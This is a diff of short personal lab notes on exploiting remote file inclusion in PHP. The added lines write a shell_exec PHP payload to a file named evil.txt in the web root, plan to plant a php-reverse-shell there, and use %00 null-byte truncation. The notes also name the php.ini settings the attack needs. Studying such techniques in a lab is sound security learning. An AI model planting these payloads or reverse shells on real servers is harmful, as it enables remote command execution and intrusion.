@@ -29,13 +29,18 @@ allow attacker to change existing php code which is more challenging
 
 
 remote file inclusion
-echo '<?php echo shell_exec("ipconfig");?>' > /var/www/evil.txt
+test: echo '<?php echo shell_exec("ipconfig");?>' > /var/www/evil.txt
+reverseshell: locate php-reverse-shell
+place it /var/wwww/
+
 modify our lab machine website lang parameter to redirect to our local machine
 make sure your apache 2 is running
 and 
 tail -f /var/log/apache2/access.log
-termina null byte string to fix error
+terminate null byte string to fix error
 %00 ignore everything after
+
+
 
 php.ini needs to have this settings to work
 allow_url_fopen = on
